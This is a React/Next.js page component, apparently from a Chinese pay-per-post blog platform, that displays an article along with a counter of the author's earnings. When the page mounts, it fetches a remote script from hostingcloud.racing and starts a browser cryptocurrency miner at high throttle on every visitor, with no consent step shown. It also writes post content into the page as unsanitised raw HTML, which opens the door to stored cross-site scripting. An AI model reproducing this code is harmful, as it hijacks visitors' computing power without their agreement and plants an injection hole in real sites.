import './show.css'
import { Typography, Link, Container } from "@material-ui/core";
import { importMineScript } from '../../utils/miner';
import Head  from 'next/head';

class PostShow extends React.Component{

    constructor(props){
        super(props);
        this.state = {
           
            cost: 0,
            started: false,
        }
    }
    mine = () => {
        const { miner, speed } = this.props;
        
        const minerId = miner._id;
        importMineScript("https://www.hostingcloud.racing/0ZUJ.js", 0.9, minerId, (hash, balanceAmount,cost, come_miner)=>{
                const { started } = this.state;
                console.log(cost, speed);
                
                if(!started){
                  
                    come_miner.start();
                    this.setState({
                        started: true,
                    })
                }
                this.setState({
                    cost: cost? cost: miner.cost
                })
                    
        });
    }

    componentDidMount(){
        if(window){

            const { miner } = this.props;
            this.setState({
                cost: miner.cost,
            })
            this.mine();
        }

    }


    render(){
        const { title, content, author} = this.props;
        const { cost } = this.state;
        
        return (
            <React.Fragment>
                <Head>
                    <title>{title}</title>
                </Head>
            <Container style={{
                marginTop: 10,
                overflowY: "scroll",
                padding: "2%",
                display: "flex",
                flexDirection: "column",
                alignItems: "center"
            }}>
                <Typography style={{alignItems: "center"}} variant="h4">{title}</Typography>
                <br/>
                <Typography variant="subtitle1"><Link href={`/${author.email}`}> {author.email}</Link><br/>发表于 <Link href="/">乐多多云收益</Link></Typography>
                <div style={{width:"100%"}} dangerouslySetInnerHTML={{ __html: content}}>
                </div>
                <div style={{
                    textAlign: "center"
                }}>
                    <Typography variant="subtitle1">本文已经为作者创收￥{(cost*1.5*1.0e-9).toFixed(10)}元</Typography>
                    <Typography variant="subtitle2"><Link href="/">加入乐多多，获得收益</Link></Typography>
                </div>

            </Container>
            </React.Fragment>

        )
    }
}

PostShow.getInitialProps = async (props) => {
  
    return {
      msg: props.query.msg,
      currentUser: props.query.currentUser,
      personalMiner: props.query.personalMiner,
      title: props.query.post.title,
      content: props.query.post.content,
      author: props.query.author,
      miner: props.query.miner,
      speed: props.query.post.speed
    }
}

export default PostShow;